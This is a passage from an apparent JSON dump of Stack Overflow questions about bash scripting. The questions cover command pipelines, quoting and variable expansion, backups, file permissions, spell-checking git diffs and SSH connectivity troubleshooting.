Finds number of files that are over 365 days old\n\nignored_files=( 'file1' 'file2' 'file3' )\npath_to_examine=\"/tmp/\"\nnewer_than=365\n\ncmd=\"find $path_to_examine -mtime -$newer_than\"\nfor file in \"${ignored_files[@]}\"; do\n    cmd=\"$cmd | grep -v \\\"$file\\\"\"\ndone\ncmd=\"$cmd | wc -l\"\necho \"Running: $cmd\"\nnum_active_files=`$cmd`\necho \"num files modified less than $newer_than days ago: $num_active_files\"\n</code></pre>\n\n<p>Output if I run that program:</p>\n\n<pre><code># ./test2.sh \nRunning: find /tmp/ -mtime -365 | grep -v \"file1\" | grep -v \"file2\" | grep -v \"file3\" | wc -l\nfind: bad option |\nfind: [-H | -L] path-list predicate-list\n# \n</code></pre>\n\n<p>Output if I run that cmd:</p>\n\n<pre><code># num=`find /tmp/ -mtime -365 | grep -v \"file1\" | grep -v \"file2\" | grep -v \"file3\" | wc -l`\n# echo $num\n10\n# \n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12731592,"title":"File parsing in bash. seperating different sub sections","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12723575/bash-parsing-part-of-a-file\">bash, parsing part of a file</a>  </p>\n</blockquote>\n\n\n\n<pre><code>Case 4\ncase 4.1\na 3\na 5\na 7\na 1\na 9\na 4\nendcase 4.1\n//\n.\n.\n. Do things that dont get parsed\n.\n.\n//\ncase 4.2 \na 1\nb 3\na 6\nb7 \nendcase 4.2\nendcase 4 \n//\n.\n.\n.\n. More things\n.\n.\n// \ncase 5\n.\n.\n.\n.\nendcase 5\n</code></pre>\n\n<p>Considering the sample file above. the command\n    awk '/^case 4.2/,/^endcase 4.2/' ./my_file.txt</p>\n\n<p>will extract from the file only the information contiained within the required section.\nHow then, would I extract from this smaller section Only the lines that start with \"a\"? My file is somewhat more complex than the sample, but I think the logic will still apply.</p>\n"},{"tags":["python","linux","bash","command-line","googlecl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":681,"score":1,"question_id":8084389,"title":"Bash: Variable in single quote","body":"<p>First take a look at this question:\n<a href=\"http://stackoverflow.com/questions/4918067/bash-or-googlecl-new-line-in-a-string-parameter\">Bash or GoogleCL: new line in a string parameter</a></p>\n\n<p>I want to add a variable ${date} into the \"summary\" now:</p>\n\n<pre><code>google youtube post ~/videos/cat-falls-down-stairs.avi Comedy \\\n    --tags 'currency of the internet' \\\n    --summary $'Today is ${date}. Poor whiskers takes a tumble.\\nShe'\\''s fine, though, don'\\''t worry.'\n</code></pre>\n\n<p>but variable wont expand inside single quote in bash.</p>\n\n<p>Is is possible to do that?</p>\n\n<p>Note: <a href=\"http://code.google.com/p/googlecl/\" rel=\"nofollow\">GoogleCL</a> is a command-line program written in python. I am on Ubuntu 10.10 with Python 2.6.</p>\n"},{"tags":["bash","floating-point"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12722095,"title":"how can I get a float division in bash?","body":"<p>I am trying to divide two images width in a Bash script, but bash gives me 0 as the result :</p>\n\n<pre><code>RESULT=$(($IMG_WIDTH/$IMG2_WIDTH))\n</code></pre>\n\n<p>I did study the bash guide and I know I should use -bc , in all examples in internet they use -bc in Echo I tried to put the same thing in my SCALE but it didnt work.</p>\n\n<p>here is the example I found in the tutorials</p>\n\n<pre><code>echo \"scale=2; ${userinput}\" | bc \n</code></pre>\n\n<p>how can I make bash to give me a floating number ? like 0.5 </p>\n"},{"tags":["java","linux","bash","permissions","hudson"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12730814,"title":"Group permissions allows for rw, but bash script gets permission denied","body":"<p>I wrote a bash script which launches a java application from Hudson. However, the application's log tells me that the bash script doesn't have permission to edit the files it needs to launch the application.</p>\n\n<p>For example, the file boot.log needs to be edited, but fails due to <code>java.io.FileNotFoundException: boot.log (Permission denied)</code>. </p>\n\n<p>The user which runs the script from hudson is called \"hudson\". I have another user which controls the jboss stuff called \"jboss\", and both \"hudson\" and \"jboss\" are under the group called \"jboss\". Sorry, I know it's a bit confusing.</p>\n\n<p>Doing an <code>ls -l</code> on boot.log shows this:<br/>\n<code>-rw-rw-r-- jboss jboss</code></p>\n\n<p>For the most part, the permissions on the user \"jboss\" are the same for the group \"jboss\", so the user \"hudson\" should have the same permissions for launching the application.</p>\n\n<p>It looks like hudson will copy the bash script I've written to /tmp and then launch it from there. When hudson runs the script, I placed the command <code>env</code> to see which user is presently running, and it's \"hudson\" as it should be. The command hudson is using looks like this:<br/></p>\n\n<p><code>/bin/bash /tmp/hudsonxxxxxxxxx.sh</code> where 'xxxxxxxxx' is some number generated by hudson.</p>\n\n<p>The strange thing is if I log in manually as \"hudson\", I can read and write to boot.log. The only way I can get past this particular permissions problem is if I <code>chmod 777 boot.log</code>, but I'd also have to apply this across multiple folders as well so it is not a good solution. Although this suggests that a different user that's not \"hudson\" or \"jboss\" is running, yet that doesn't seem to be the case due to what I've observed above?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12711023,"title":"How to track file creation and modification","body":"<p>We have put together a perl script that essentially looks at the argument that is being passed to it checks if is creating or modifying a file then it saves that in a mysql database so that it is easily accessible later. Here is the interesting part, how do I make this perl script run before all of the commands typed in the terminal. I need to make this dummy proof so people don't forget to run it.</p>\n\n<p>Sorry I didn't formulate this question properly. What I want to do is prepend to each command such that each command will run like so \"./run.pl ls\" for example. That way I can track file changes if the command is mv or it creates an out file for example. The script pretty much takes care of that but I just don't know how to run it seamlessly to the user. </p>\n\n<p>I am running ubuntu server with the bash terminal.</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","backup","centos","plesk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12728429,"title":"Suggestion about a BASH script for backups","body":"<p>I have a server(centOS) with plesk installed and I need to planning some backups for each day.\nPlesk allows only one planned backup, so I created this solution:</p>\n\n<ol>\n<li>Create every night a backup inside a folder</li>\n<li>Launch a script that will read the day from the title of a txt file inside the folder (launched every night via cronTAB)</li>\n<li>Move the backup file inside the correct directoy (based on the name of the day)</li>\n<li>Change the name of the day in the title of the txt</li>\n</ol>\n\n<p>This is my script (not tested right now):</p>\n\n<pre><code>BACKUPNAME=\"backupname\"\ncd /backup/daily\nfind . -type f | while IFS= read filename; do\n  case \"${filename,,*}\" in \n    mon.txt) mv $BACKUPNAME ../mon\n    mv mon.txt tue.txt;;\n    tue.txt) mv $BACKUPNAME ../tue\n    mv tue.txt wed.txt;;\n    wed.txt) mv $BACKUPNAME ../wed\n    mv wed.txt thu.txt;;\n    thu.txt) mv $BACKUPNAME ../thu\n    mv thu.txt fri.txt;;\n    fri.txt) mv $BACKUPNAME ../fri\n    mv fri.txt sat.txt;;\n    sat.txt) mv $BACKUPNAME ../sat\n    mv sat.txt sun.txt;;\n    sun.txt) mv $BACKUPNAME ../sun\n    mv sun.txt mon.txt;;\n    * : ;; #nothing\n  esac\ndone\n</code></pre>\n\n<p>Do you think is it a good/stable solution?</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12723878,"title":"Bash cmdlist using { } doesn't work","body":"<p>I read about commands within the <code>{ }</code>, happen in the current shell without start a new so The following commands:</p>\n\n<p><code>for i in {1..50000} ;  do echo $i ; done</code></p>\n\n<p>should works the same as</p>\n\n<p><code>for i in {1..50000} ; { do echo $i } ; done</code></p>\n\n<p>but it gives me an error:</p>\n\n<p><code>zsh: parse error near</code>do'`</p>\n\n<p>any idea?</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12724361,"title":"Why the shell script gives me a too many argument error?","body":"<pre><code>#! /bin/bash\n\nif [ !\\(-f new.bash -o -d new.bash\\) ]\nthen\n    echo \"Neither\"\nelse\n    echo \"yes\"\nfi\n</code></pre>\n\n<p>it works but leaves an error:</p>\n\n<pre><code>/file_exist_or_not.bash      \n./file_exist_or_not.bash: line 3: [: too many arguments\nyes\n</code></pre>\n\n<p>BTW, Why the inner parenthesises needs to be escaped?</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12728866,"title":"Concatenating files with a different name but the same number in a folder with muliple files","body":"<p>I am very new to Shell/Bash but I want to use it to establish a pipeline for some analyses. I have used bash to generate multiple files like this:</p>\n\n<pre><code>for i in {1..10}; \n    do sim XX.in.$i.txt &gt; XX.out.$i.txt;\n    done;\n\nfor i in {1..10}; \n    do sim YY.in.$i.txt &gt; YY.out.$i.txt;\n    done;\n</code></pre>\n\n<p>which gives me 20 outputfiles; XX.out.1.txt, XX.out.2.txt, YY.out.1.txt, YY.out.2.txt etc.</p>\n\n<p>Now I want to concatinate XX.out.1.txt and YY.out.1.txt and then XX.out.2.txt and YY.out.2.txt etc, so always only two files with different names but the same NUMBER.\nWhat is the easiest way to do this?</p>\n"},{"tags":["linux","bash","pipe"],"answer_count":9,"favorite_count":2,"up_vote_count":14,"down_vote_count":0,"view_count":27772,"score":14,"question_id":2746553,"title":"Bash script, read values from stdin pipe","body":"<p>I'm trying to get bash to process data from stdin that gets piped it, but no luck, what I mean is none of the following work:</p>\n\n<pre><code>echo \"hello world\" | test=($(&lt; /dev/stdin)); echo test=$test\ntest=\n\n\necho \"hello world\" | read test; echo test=$test\ntest=\n\n\necho \"hello world\" | test=`cat`; echo test=$test\ntest=\n</code></pre>\n\n<p>where I want the output to be <code>test=hello world</code>. Note I've tried putting \"\" quotes around <code>\"$test\"</code> that doesn't work either.</p>\n"},{"tags":["bash","parsing"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12723575,"title":"bash, parsing part of a file","body":"<p>Imagine a text file something like the following:</p>\n\n<pre><code>Case 4\ncase 4.1\na 3\na 5\na 7\na 1\na 9\na 4\nendcase 4.1\n//\n.\n.\n. Do things that dont get parsed\n.\n.\n//\ncase 4.2\na 1\nb 3\na 6\nb7 \nendcase 4.2\nendcase 4\n//\n.\n.\n.\n. More things\n.\n.\n//\ncase 5\n.\n.\n.\n.\nendcase 5\n</code></pre>\n\n<p>which contains the values of multiple variables at different points in time. Eg, case 4 concerns variable a and b. How do I extract only the lines between say case 4.1 and endcase 4.1?</p>\n"},{"tags":["linux","bash","exit","exitstatus"],"answer_count":4,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":4163,"score":3,"question_id":3822621,"title":"How to exit if a command failed?","body":"<p>I am a noob in shell-scripting. I want to print a message and exit my script if a command fails. I've tried :</p>\n\n<p><code>my_command &amp;&amp; (echo 'my_command failed; exit)</code></p>\n\n<p>but it does not work. It keeps executing the instructions following this line in the script. I'm using Ubuntu and bash.</p>\n\n<p>Thanks all.</p>\n"},{"tags":["java","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":40,"score":0,"question_id":12724460,"title":"script bash or java code to delete in every file html of my folder a tag","body":"<p>hi mate i have in my folder a lot of file html equal( the only difference is the string).\ni want in every file html of my folder delete a tag.\nan example of my file html:</p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;title&gt;P0001 Generic DTC: Fuel Volume Regulator Control Circuit/Open&lt;/title&gt;\n    &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /&gt;\n    &lt;meta name=\"description\" content=\"P0001 diagnostic trouble code details.\" /&gt;\n    &lt;meta name=\"keywords\" content=\"P0001, obd code, obd codes, diagnostic codes, trouble codes, diagnostic trouble codes, ford, gm, toyota, chrysler, dodge, nissan, chevy, dtc, dtcs, engine code, engine codes, check engine light\" /&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/base.css\"/&gt;\n    &lt;link rel=\"shortcut icon\" href=\"/static/img/favicon.ico\" /&gt;\n\n    &lt;script type=\"text/javascript\"&gt;\n      var _gaq = _gaq || [];\n      _gaq.push(['_setAccount', 'UA-1196991-3']);\n      _gaq.push(['_trackPageview']);\n      (function() {\n        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\n        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';\n        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\n      })();\n    &lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body  class=\"results one\"&gt;\n    &lt;div id=\"main\"&gt;\n      &lt;div id=\"header\"&gt;\n        &lt;div id=\"logo\"&gt;&lt;a href=\"/\"&gt;DTCSearch.com&lt;/a&gt;&lt;/div&gt;\n        &lt;form action=\"/\" method=\"post\"&gt;\n          &lt;p&gt;\n            &lt;input type=\"text\" id=\"query\" name=\"query\" value=\"P0001\"/&gt;\n            &lt;input type=\"submit\" id=\"submit\" value=\"\"/&gt;\n          &lt;/p&gt;\n\n        &lt;/form&gt;\n      &lt;/div&gt;\n      &lt;div id=\"content\"&gt;\n\n&lt;h1&gt;P0001 OBD Trouble Code&lt;/h1&gt;\n&lt;p&gt;1 result found&lt;/p&gt;\n\n\n&lt;div id=\"content-body\"&gt;\n\n  &lt;table cellspacing=\"0\" class=\"one\"&gt;\n    &lt;caption&gt;P0001 - Generic&lt;/caption&gt;\n    &lt;tr&gt;\n      &lt;th&gt;Type&lt;/th&gt;\n      &lt;td&gt;Powertrain - Fuel and Air Metering - ISO/SAE Controlled&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;th&gt;Description&lt;/th&gt;\n      &lt;td&gt;&lt;p&gt;Fuel Volume Regulator Control Circuit/Open&lt;/p&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n\n\n\n  &lt;/table&gt;\n\n  &lt;p style=\"font-weight:bold\"&gt;Try also: &lt;a href=\"http://www.obd-codes.com/p0001\" target=\"_blank\"&gt;http://www.obd-codes.com/p0001&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n\n      &lt;/div&gt;\n      &lt;div id=\"footer\"&gt;\n   &lt;div id=\"footer_banner\"&gt;\n\n&lt;a href=\"http://affiliates.eautorepair.net/z/15/CD65/&amp;dp=84\"&gt;&lt;img src=\"http://affiliates.eautorepair.net/42/65/15/&amp;dp=84\" alt=\"Do it Yourself Automobile Repair Information\" border=\"0\"&gt;&lt;/a&gt;\n\n   &lt;/div&gt;\n        &lt;p&gt;Copyright &amp;copy; 2008&amp;ndash;2012 DTCSearch.com&lt;br/&gt;\n        DTCSearch.com is hosted by &lt;a href=\"http://www.scantool.net\"&gt;ScanTool.net, LLC&lt;/a&gt;&lt;/p&gt;\n      &lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;`\n</code></pre>\n\n<p>i want to delete in every file this tag:</p>\n\n<pre><code>&lt;a href=\"http://affiliates.eautorepair.net/z/15/CD65/&amp;dp=84\"&gt;&lt;img src=\"http://affiliates.eautorepair.net/42/65/15/&amp;dp=84\" alt=\"Do it Yourself Automobile Repair Information\" border=\"0\"&gt;&lt;/a&gt;\n</code></pre>\n\n<p>how do this ? tell me a solution with java or with bash or whit other tecnology.</p>\n"},{"tags":["linux","perl","bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":801,"score":3,"question_id":9165572,"title":"Perl get UTC time and get difference between UTC timestamps","body":"<p>I'm looking for some Perl help on how to do this properly.  I don't mind using a library to do this.</p>\n\n<p>I'm pulling a UTC time stamp from a mySQL database, in this format:  2012-02-06 13:50:09</p>\n\n<p>I need Perl to pull the current UTC time and get the difference between the two time stamps in minutes (or seconds).  I was doing this in a Unix subprocess, but I'm having difficulty getting the UTC time and comparing it, since the local box is running on Eastern time.  I wouldn't mind doing this in Unix time, but not sure how to accurately get the UTC time to compare to the \"last_timestamp\" which is a UTC based timestamp from mysql.</p>\n\n<pre><code>my $date_diff = qx(date -d \"\\$(date +'%F %T')\" +%s) -\nqx(date -d            \"$last_timestamp\" +%s); \n</code></pre>\n\n<p>As always your help is certainly appreciated and valued.</p>\n"},{"tags":["bash","permissions","script"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":392,"score":2,"question_id":7910582,"title":"Checking file owner permissions","body":"<p>I'm trying to test if a file has the execute bit set for the owner in bash script.</p>\n\n<p>I know <code>if [ -x filename ]</code> checks for execute permission for the User running the statement but i need to know if the owner has it. Is there a way to specify owner?</p>\n"},{"tags":["bash","script","samba","change-password"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":533,"score":0,"question_id":9208640,"title":"Change user password in samba server with the pdbedit tool","body":"<p>I am trying to change user password with script but I'm having trouble using the -t option. Here's what I try:</p>\n\n<pre><code>echo -e \"12345\\n12345\\n\" | pdbedit -t -u username\n</code></pre>\n\n<p>So this is wrong somehow. Any ideas what I am missing or what should I try?</p>\n"},{"tags":["linux","bash","groovy"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":608,"score":0,"question_id":7363946,"title":"How do I execute an arbitrary script with a working directory of the directory its in?","body":"<p>I need to execute a groovy script file from bash, and I need the script to have a working directory of the directory it exists in.</p>\n\n<p>That is, in my bash script, I'm doing this:</p>\n\n<pre><code>/opt/script/myscript.groovy &amp;\n</code></pre>\n\n<p>But this seems to set the working directory to <code>/etc/init.d</code>, the directory I'm calling from. How do I change the working directory for that script to <code>/opt/script</code>?</p>\n"},{"tags":["bash","debugging","shell","command-line","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12723551,"title":"\"Debugging\" bash shell script: escaping characters, passing arguments","body":"<p>I am trying to write a bash shell script (which is something I don't have much experience with) to search in C code on the Unix machine I'm operating through ssh.</p>\n\n<p>This is the code in my script:</p>\n\n<pre><code>#! /bin/bash\n\nfind . \\( -name '*.c' -o -name '*.h' \\) -exec grep -n '&lt;SEARCH_STRING&gt;' {} + | sed -e \"s/^\\(\\..*\\.c\\):\\([0-9]*\\):[ \\t]*\\(.*\\)$/\\1 :: \\2\\n\\3\\n/\" | sed -e \"s/^\\(\\..*\\.h\\):\\([0-9]*\\):[ \\t]*\\(.*\\)$/\\1 :: \\2\\n\\3\\n/\" | sed ''/&lt;SEARCH_STRING&gt;/s//`printf \"\\033[31m&lt;SEARCH_STRING&gt;\\033[0m\"`/'' | less -R\n</code></pre>\n\n<p>Note that  is merely what I use to represent my search string, of course I'm not actually searching for this literally.</p>\n\n<p>I realise there are a couple of things wrong with this. First of all, when I type the bottom line (the \"script\" without its #!/bin/bash header) into the command line, it actually works just fine and gives me the result I want. I know that I should escape certain characters when making it into a bash script, but I've tried escaping several (combinations of) characters and it always gives me the same error:</p>\n\n<pre><code>find: missing argument to `-exec'\n./code_search.sh: line 4: &lt;SEARCH_STRING&gt;: command not found\nsed: -e expression #1, char 43: unterminated `s' command\nprintf: usage: printf [-v var] format [arguments]\n./code_search.sh: line 8: \\033[31m&lt;SEARCH_STRING&gt;\\033[0m: command not found\nsed: -e expression #1, char 46: unterminated `s' command\n</code></pre>\n\n<p>Also, I realise I shouldn't hard-code the search string into my script, as it's a lot more convenient to give the search string to the script as a parameter, but I really can't figure out how to do that either.</p>\n\n<p>As I said, I don't have a lot of experience writing bash scripts, and I tried writing this script to help me with my coding work. However, I can't spend any more time on debugging this seeing as that's not what my boss pays me to do. I've asked my colleagues, but none of them can help me either.</p>\n\n<p>I know it's a little cheap not to put in a lot of effort to learn more about bash shell scripting myself, but like I said I really can't spare the time. Could anyone please help me finish this script?</p>\n\n<p>Thanks a lot in advance!</p>\n"},{"tags":["bash","ssh","internet"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12715233,"title":"why can I ping a server but not connect via ssh?","body":"<p>When I ping my server, it responds:</p>\n\n<pre><code>user@localhost:~$ ping my.server\nPING my.server (111.111.111.11) 56(84) bytes of data.\n64 bytes from my.server (111.111.111.11): icmp_req=1 ttl=42 time=38.4 ms\n64 bytes from my.server (111.111.111.11): icmp_req=2 ttl=42 time=50.0 ms\n64 bytes from my.server (111.111.111.11): icmp_req=3 ttl=42 time=58.6 ms\n^C\n--- my.server ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 38.419/49.037/58.637/8.287 ms\n</code></pre>\n\n<p>but when I try to ssh (something that I always do, and have been doing for the past few hours on the same connection), it hangs:</p>\n\n<pre><code>user@localhost:~$ ssh my.server\n</code></pre>\n\n<p>speedtest.net says that my connection has 1.5 Mbps download and 0.4 Mbps upload speed</p>\n\n<p>is there a reason that ssh hangs?</p>\n\n<hr>\n\n<p>Results from suggestions provided in answers</p>\n\n<p>from @nsfyn55</p>\n\n<pre><code>user@localhost:~$ telnetmy.server 22 \nTrying 111.111.111.11...\nConnected to my.server\nEscape character is '^]'.\nSSH-2.0-OpenSSH_4.3\nConnection closed by foreign host.\n</code></pre>\n\n<p>from @vahid:</p>\n\n<pre><code>user@localhost:~$ nc -v -w 1 111.111.111.111 -z 22\nnc: timeout cannot be negative\n</code></pre>\n"},{"tags":["regex","bash","unix","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":83,"score":-1,"question_id":12719128,"title":"Remove/replace html tags in bash","body":"<p>I have a file with lines that contain: </p>\n\n<pre><code>    &lt;li&gt;&lt;b&gt; Some Text:&lt;/b&gt; More Text &lt;/li&gt;\n</code></pre>\n\n<p>I want to remove the html tags and replace the <code>&lt;/b&gt;</code> tag with a dash so it becomes like this:</p>\n\n<p>Some Text:- More Text</p>\n\n<p>I'm trying to use sed however I can't find the proper regex combination.</p>\n"},{"tags":["eclipse","bash","terminal","cygwin"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12721332,"title":"eclipse terminal (cygwin?) save profile -> for example a new alias","body":"<p>I'm troubling with the terminal view of eclipse. I'm working on Win7 and want to create an alias in this terminal. Well, creating an alias is not hard, but keeping the alias after a restart doesn't work.</p>\n\n<p>Where can I change my profile, which is loaded initially by starting eclipse (or terminal view)?</p>\n\n<p>Or does it exist anyway?</p>\n\n<p>thanks</p>\n\n<p><em>ps: for those, who want to know how to create an alias (this was for my usage):</em></p>\n\n<pre><code>alias php='/C/xammp/php/php.exe'\n</code></pre>\n\n<p><em><strong>edit: found the solution:</em></strong></p>\n\n<pre><code># go to your home directory\ncd \n# create / edit .bashrc file\nvi .bashrc\n# paste the alias command from above\n# save\n# restart\nexec bash\n</code></pre>\n"},{"tags":["bash","dialog","putty"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":12721445,"title":"Shell dialog quits when using numberpad","body":"<p>When I create a dialog with an input field and then enter some numbers using the number pad on the right side of the keyboard, it quits. It does not quit when I use the numbers on the top of the keyboard...</p>\n\n<p>any ideas how to prevent this? Here an example dialog</p>\n\n<pre><code>dialog --backtitle \"Dialog Title\" --title \"Username required\" --inputbox \"Please enter a username\" 8 60\n</code></pre>\n"},{"tags":["osx","bash","script","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12720891,"title":"Script won't recognize the file / directory","body":"<p>For class we have to work on a remote server that the school hosts.  So far I have made a lot of files on the server and I would like to back them up in case I want to transfer them to my laptop or in case I accidentally delete a directory or make a silly error.  I found a tutorial and a script to back up the file and I decided to modify it so that it would determine what directory it's in (which will be the main user's) and the cd to the Documents.  It also creates the directory Backups if it doesn't exist.  I am still pretty new to this sort of scripting and any additional advice or post links would be greatly appreciated.</p>\n\n<p>Code:</p>\n\n<pre><code>#!/bin/bash\n#######################################################\n##       Simple backup script..   \n## Created by Matthew Brunt: (openblue555@gmail.com)\n## Licensed under GNU GPL v3 or later, at your option.\n##   http://www.gnu.org/licenses/gpl.html\n##\n## Further edited by Michael Garrison to backup the \n## directory it is located in and print the contents.\n#######################################################\n\nmkdir -p Backup\n\n#Defines our output file\nOUTPUT= $( cd Backup &amp;&amp; pwd )/backup_$(date +%Y%m%d).tar.gz\n\n#Defines our directory to backup\nBUDIR=$( cd Desktop &amp;&amp; pwd )\n#Display message about starting the backup\necho \"Starting backup of directory $BUDIR to file $OUTPUT\"\n\n#Start the backup\ntar -cZf $OUTPUT $BUDIR\n\n#Checking the status of the last process:\nif [ $? == 0 ]; then\n        #Display confirmation message\n    echo \"The file:\"\n        echo $OUTPUT\n    echo \"was created as a backup for:\"\n        echo $BUDIR\n\n        echo \"\"\n    echo \"Items that were backed up include:\"\n\n    for i in $BUDIR; do\n            echo $i\n    done\n        echo \"\"\nelse\n    #Display error message message\n        echo \"There was a problem creating:\"\n        echo $OUTPUT\n    echo \"as a backup for:\"\n    echo $BUDIR\nfi\n</code></pre>\n\n<p>I know that the original script works and it worked until I changed the <code>$OUTPUT</code> variable.  I currently get the following result:</p>\n\n<pre><code>./backup.sh\n./backup.sh: line 15: /Users/mgarrison93/Backup/backup_20121004.tar.gz: No such file\nor directory\nStarting backup of directory /Users/mgarrison93/Desktop to file \ntar: no files or directories specified\nThere was a problem creating:\n\nas a backup for:\n/Users/mgarrison93/Desktop\n</code></pre>\n\n<p>I can see that it is not accepting the file name, but I don't know how to correct this.</p>\n\n<p>I just tried changing <code>$OUTPUT</code> to <code>/Backups/file-name.tar.gz</code> which I originally had and it works fine.  The problem seems to be <code>$( cd Backup &amp;&amp; pwd )/backup_$(date +%Y%m%d).tar.gz</code>.  Just not sure what is wrong.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12721824,"title":"Pre-character escaping in bash","body":"<p>I read <a href=\"http://wiki.bash-hackers.org/syntax/quoting\" rel=\"nofollow\">this article</a>, in the part</p>\n\n<pre><code>### NO NO NO: this passes three strings:\n###      (1)  \"my\n###      (2)  multiword\n###      (3)  argument\"\nMYARG=\"\\\"my multiword argument\\\"\"\nsomecommand $MYARG\n\n### THIS IS NOT (!!!!) THE SAME AS ###\ncommand \"my multiword argument\"\n\n### YOU NEED ###\nMYARG=\"my multiword argument\"\ncommand \"$MYARG\"\n</code></pre>\n\n<p>both of method interpret as a full string, different from what it says in the article:</p>\n\n<pre><code>test.bash\n\n#! /bin/bash\necho $1\n\n./test.bash \"\\\"my good ness\\\"\"\n\"my good ness\"\n</code></pre>\n"},{"tags":["git","bash","grep","spellchecking","aspell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":10847333,"title":"Aspell not returning misspelled words when using sgml mode with an extra dictionary","body":"<p>I am absolutely baffled by this. I have a script that spell checks stuff that is staged in Git. Here is the command that gets the list of misspelled words:</p>\n\n<pre><code>git diff --cached | grep -e \"^+[^+]\" | aspell list --mode sgml --lang en --extra-dicts=/home/test/dictionary.test --add-sgml-skip={ulink,literal,screen} | sort | uniq\n</code></pre>\n\n<p>Number of arguments in --add-sgml-skip is not relevant. The dictionary.test file is generated with:</p>\n\n<pre><code>aspell --lang=en create master /home/test/dictionary.test &lt; /home/test/dict.txt\n</code></pre>\n\n<p>This all works and is all fine but in a single document, it does not work, no words are found. I have no idea why this happens. Here is some more info:</p>\n\n<pre><code>&gt; git diff --cached | grep -e \"^+[^+]\" | wc -l\n250\n&gt; git diff --cached | grep -e \"^+[^+]\" | aspell list --mode sgml --lang en --extra-dicts=/home/test/dictionary.test | sort | uniq | wc -l\n39\n&gt; git diff --cached | grep -e \"^+[^+]\" | aspell list --mode sgml --lang en --extra-dicts=/home/test/dictionary.test --add-sgml-skip={ulink} | sort | uniq | wc -l\n39\n&gt; git diff --cached | grep -e \"^+[^+]\" | aspell list --mode sgml --lang en --extra-dicts=/home/test/dictionary.test --add-sgml-skip={ulink,literal} | sort | uniq | wc -l\n0\n</code></pre>\n\n<p>When I run this command in other repos, it works flawlessly. I've been trying to figure this out for a day now and am at loss. I must know why this happens otherwise I won't get another night of sleep :) Help would be much appreciated.</p>\n"},{"tags":["python","linux","perl","bash","tmux"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12719710,"title":"Removing display control codes from typescript / tmux output","body":"<p>I'm using the pipe-pane of tmux to record what I was doing, and I want to parse and take a account of the commands I typed etc.  But when I got the <code>xxx.log</code> file, and opened it with vim, I found that there are many special word like ^H,^M,^G etc,see the sample:  </p>\n\n<pre><code>administrator@ubuntu:~$ echo \"hello,world[K[K[K[K[K[K[K[K[K[K\"\nh\nadministrator@ubuntu:~$ ^G^G^G^G\nadministrator@ubuntu:~$ \n</code></pre>\n\n<p>I know that tmux records everything I typed, but some keys with Ctrl/alt prefix can not be displayed, and I want to ignore them. How can I archive that with perl/python or C, any tips?</p>\n"},{"tags":["regex","bash","curl","script","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12718142,"title":"curl 